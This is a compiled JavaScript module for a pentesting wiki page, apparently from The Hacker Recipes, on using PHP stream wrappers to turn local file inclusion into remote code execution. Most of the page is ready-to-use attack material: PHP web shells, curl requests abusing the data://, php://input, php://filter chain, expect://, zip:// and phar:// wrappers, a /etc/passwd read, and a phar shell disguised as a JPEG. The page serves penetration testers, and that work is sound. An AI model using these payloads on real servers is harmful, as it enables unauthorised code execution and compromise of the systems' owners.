import{_ as i,c as a,a5 as e,o as t}from"./chunks/framework.B5CpDqM0.js";const c=JSON.parse('{"title":"PHP wrappers and streams","description":"","frontmatter":{"authors":"LucasParsy, ShutdownRepo"},"headers":[],"relativePath":"web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams.md","filePath":"web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams.md","lastUpdated":1724982529000}'),n={name:"web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams.md"};function p(h,s,l,k,r,d){return t(),a("div",null,s[0]||(s[0]=[e(`<h1 id="php-wrappers-and-streams" tabindex="-1">PHP wrappers and streams <a class="header-anchor" href="#php-wrappers-and-streams" aria-label="Permalink to &quot;PHP wrappers and streams&quot;">​</a></h1><details class="details custom-block"><summary>data://</summary><p>The attribute <code>allow_url_include</code> must be set. This configuration can be checked in the <code>php.ini</code> file.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Shell in base64 encoding</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;&lt;?php system(</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$_GET</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">[&#39;cmd&#39;]); ?&gt;&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> base64</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Accessing the log file via LFI</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --user-agent</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PENTEST&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$URL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/?parameter=data://text/plain;base64,</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$SHELL_BASE64</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&amp;cmd=id&quot;</span></span></code></pre></div></details><details class="details custom-block"><summary>php://input</summary><p>The attribute <code>allow_url_include</code> should be set. This configuration can be checked in the <code>php.ini</code> file.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Testers should make sure to change the $URL</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --user-agent</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PENTEST&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -s</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -X</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> POST</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --data</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;&lt;?php system(&#39;id&#39;); ?&gt;&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$URL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">?parameter=php://input&quot;</span></span></code></pre></div></details><details class="details custom-block"><summary>php://filter</summary><p>The <code>filter</code> wrapper doesn&#39;t require the <code>allow_url_include</code> to be set. This works on default PHP configuration <code>allow_url_include=off</code>.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Testers should make sure to change the $URL, $FILTERS with the chaining that generates their payload and $FILE with the path to the file they can read.</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --user-agent</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PENTEST&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$URL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">?parameter=php://filter/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$FILTERS</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/resource=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$FILE</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span></span></code></pre></div><p>The <a href="https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py" target="_blank" rel="noreferrer">php_filter_chain_generator.py</a> script (Python3) implements the generation of the PHP filters chaining.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># Example: generate &lt;?=\`$_GET[cmd]\`;;?&gt; (base64 value: PD89YCRfR0VUW2NtZF1gOzs/Pg) using /etc/passwd file to run whoami command on the target.</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Generate the payload </span></span>
<span class="line"><span>python3 php_filter_chain_generator.py --chain &#39;&lt;?=\`$_GET[cmd]\`;;?&gt;&#39;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Fill variables</span></span>
<span class="line"><span>FILTERS=&quot;convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|[...]|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode&quot;</span></span>
<span class="line"><span>FILE=&quot;/etc/passwd&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Get RCE on the target</span></span>
<span class="line"><span>curl --user-agent &quot;PENTEST&quot; &quot;$URL?parameter=php://filter/$FILTERS/resource=$FILE&amp;cmd=whoami&quot;</span></span></code></pre></div><p>Finding a valid path to a file on the target is not required. PHP wrappers like <code>php://temp</code> can be used instead.</p><p>The research article &quot;<a href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html" target="_blank" rel="noreferrer">PHP filters chain: What is it and how to use it</a>&quot; from Synacktiv, and <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d" target="_blank" rel="noreferrer">the original writeup</a>, go into the details of that technique.</p></details><details class="details custom-block"><summary>expect://</summary><p>The <code>expect</code> wrapper doesn&#39;t required the <code>allow_url_include</code> configuration, the <code>expect</code> extension is required instead.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --user-agent</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PENTEST&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -s</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$URL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/?parameter=expect://id&quot;</span></span></code></pre></div></details><details class="details custom-block"><summary>zip://</summary><p>The prerequisite for this method is to be able to <a href="./../../unrestricted-file-upload">upload a file</a>.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;&lt;?php system(</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$_GET</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">[&#39;cmd&#39;]); ?&gt;&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> payload.php</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">zip</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> payload.zip</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> payload.php</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Accessing the log file via LFI (the # identifier is URL-encoded)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --user-agent</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PENTEST&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$URL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/?parameter=zip://payload.zip%23payload.php&amp;cmd=id&quot;</span></span></code></pre></div></details><details class="details custom-block"><summary>phar://</summary><p>The prerequisite for this method is to be able to <a href="./../../unrestricted-file-upload">upload a file</a>.</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;?</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">php</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$phar </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> new</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> Phar</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;shell.phar&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$phar</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-&gt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">startBuffering</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">();</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$phar</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-&gt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">addFromString</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;shell.txt&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$phar</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-&gt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">setStub</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$phar</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-&gt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">stopBuffering</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">();</span></span></code></pre></div><p>The tester need to compile this script into a <code>.phar</code> file that when called would write a shell called <code>shell.txt</code> .</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">php</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --define</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> phar.readonly=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> shell.php</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &amp;&amp; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">mv</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> shell.phar</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> shell.jpg</span></span></code></pre></div><p>Now the tester has a <code>phar</code> file named <code>shell.jpg</code> and he can trigger it through the <code>phar://</code> wrapper.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --user-agent</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PENTEST&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$URL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/?parameter=phar://./shell.jpg%2Fshell.txt&amp;cmd=id&quot;</span></span></code></pre></div></details>`,7)]))}const g=i(n,[["render",p]]);export{c as __pageData,g as default};